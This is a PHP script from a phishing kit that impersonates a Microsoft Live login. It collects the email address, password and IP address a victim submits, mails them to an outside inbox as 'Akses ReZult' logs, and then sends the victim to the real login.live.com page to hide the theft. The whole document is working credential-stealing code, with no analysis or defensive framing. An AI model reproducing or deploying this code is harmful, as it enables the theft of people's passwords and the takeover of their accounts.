<?
$ip = getenv("REMOTE_ADDR");
$message .= "-----------------Akses ReSulT--------------------\n";
$message .= "Email Address        : ".$_POST['email']."\n";
$message .= "Password       : ".$_POST['password']."\n";
$message .= "----------------created by CD-------------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "-----------------Akses ReSulT--------------------\n";
$send = "jerrymacj10@inbox.eu";
$subject = "Akses ReZulTs";
$headers = "From: ReZult<logzz@anyhost.edu>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send",$subject,$message,$headers);
?>
<script>
    window.top.location.href = "https://login.live.com/login.srf";

</script>